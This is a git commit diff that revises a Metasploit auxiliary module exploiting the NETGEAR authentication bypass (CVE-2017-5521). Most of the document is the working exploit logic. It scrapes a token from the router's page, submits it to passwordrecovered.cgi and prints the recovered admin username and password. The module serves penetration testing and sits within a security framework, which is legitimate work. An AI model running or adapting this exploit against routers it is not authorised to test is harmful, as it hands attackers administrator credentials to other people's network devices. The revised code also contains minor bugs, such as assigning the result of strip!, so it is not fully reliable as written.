c94976f49ea15993126b2f7b937e3f85452c2fc2
Carter <cbawsome77@gmail.com>
2017-02-07 22:18:11 -0500

    Update netgear_admin_password_disclosure.rb

--- netgear stuff/netgear_admin_password_disclosure.rb
+++ netgear stuff/netgear_admin_password_disclosure.rb
@@ -1,4 +1,3 @@
-# -*- coding: binary -*-
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -14,12 +13,13 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'NETGEAR Administrator Password Disclosure',
       'Description'    => %q{
-        This module will collect the the password for the `admin` user.
+        This module will collect the password for the `admin` user.
         The exploit will not complete if password recovery is set on the router.
         The password is recieved by passing the token generated from `unauth.cgi`
         to `passwordrecovered.cgi`. This exploit works on many different NETGEAR
-        products. The full list of affected productsis available here:
-        http://pastebin.com/dB4bTgxz
+        products. The full list of affected products is available in the 'References'
+        section.
+
       },
       'Author'         =>
         [
@@ -32,6 +32,7 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2017-003/?fid=8911' ],
           [ 'URL', 'http://thehackernews.com/2017/01/Netgear-router-password-hacking.html'],
           [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2017-5521--Bypassing-Authentication-on-NETGEAR-Routers/'],
+          [ 'URL', 'http://pastebin.com/dB4bTgxz'],
           [ 'EDB', '41205']
         ],
       'License'        => MSF_LICENSE
@@ -39,72 +40,85 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
     [
-      OptPort::new('RPORT', [true, 'The port to connect to RHOST with', 80]),
-      OptString::new('RHOST', [true, 'The router target ip address', nil])
+      OptString::new('TARGETURI', [true, 'The base path to the vulnerable application', '/'])
     ], self.class)
   end
 
   # @return substring of 'text', usually a response from a server in this case
   def scrape(text, start_trig, end_trig)
-    return text[/#{start_trig}(.*?)#{end_trig}/m, 1]
+    text[/#{start_trig}(.*?)#{end_trig}/m, 1]
   end
 
   def run
-    rhost = datastore['RHOST']
+    uri = target_uri.path
+    uri = normalize_uri(uri)
     print_status("Checking if #{rhost} is a NETGEAR router")
-    
     vprint_status("Sending request to http://#{rhost}/")
 
     # will always call check no matter what
     is_ng = check
 
-    res = send_request_raw({ 'uri' => '/'})
+    res = send_request_cgi({ 'uri' => uri })
+    if res.nil?
+      print_error("#{rhost} returned an empty response.")
+      return
+    end
 
     if is_ng == Exploit::CheckCode::Detected
       marker_one = "id="
       marker_two = "\""
       token = scrape(res.to_s, marker_one, marker_two)
-      if token == nil
+      if token.nil?
         print_error("#{rhost} is not vulnerable: Token not found")
         return
       end
 
+      if token == '0'
+        print_status("If no creds are found, try the exploit again. #{rhost} returned a token of 0")
+      end
       print_status("Token found: #{token}")
-      vprint_status("Token found at #{rhost}/unauth.cgi?id=xxxxxxxx")
-      
-      r = send_request_raw({'uri' => "/passwordrecovered.cgi?id=#{token}"})
+      vprint_status("Token found at #{rhost}/unauth.cgi?id=#{token}")
+
+      r = send_request_cgi({
+        'uri' => "/passwordrecovered.cgi",
+        'vars_get' => { 'id'  =>  token }
+      })
+
       vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
 
-      if r.to_s.include?('left">') != nil
-        username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td>
-			<td class=\"MNUText\" align=\"left\">", "</td>")
-        password = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Password</td>
-			<td class=\"MNUText\" align=\"left\">", "</td>")
+      html = r.get_html_document
+      raw_html = html.text
 
+      username = scrape(raw_html, "Router Admin Username", "Router Admin Password")
+      password = scrape(raw_html, "Router Admin Password", "You can")
+      if username.nil? || password.nil?
+        return Exploit::CheckCode::Safe
+      else  
+        username = username.strip!
+        password = password.strip!
+      end
+      if username == "" || password == ""
+        print_error("No Creds found")
+      else
         print_good("Creds found: #{username}/#{password}")
-        
-      else 
-        print_error("#{rhost} is not vulnerable because password recovery is on.")
       end
     else
       print_error("#{rhost} is not vulnerable: Not a NETGEAR device")
-      return
     end
   end
 
-  #Almost every NETGEAR router sends a 'WWW-Authenticate' header in the response
-  #This checks the response dor that header.
-  def check                             #NOTE: this is working
-    res = send_request_raw({'uri'=>'/'})
-    
-    unless res
-      fail_with(Failure::Unknown, 'Connection timed out.')
+  # Almost every NETGEAR router sends a 'WWW-Authenticate' header in the response
+  # This checks the response for that header.
+  def check
+
+    res = send_request_cgi({'uri'=>'/'})
+    if res.nil?
+      fail_with(Failure::Unreachable, 'Connection timed out.')
     end
 
-    data = res.to_s
-    
     # Checks for the `WWW-Authenticate` header in the response
-    if data.include? "WWW-Authenticate"
+    if res.headers["WWW-Authenticate"]
+      data = res.to_s
       marker_one = "Basic realm=\""
       marker_two = "\""
       model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
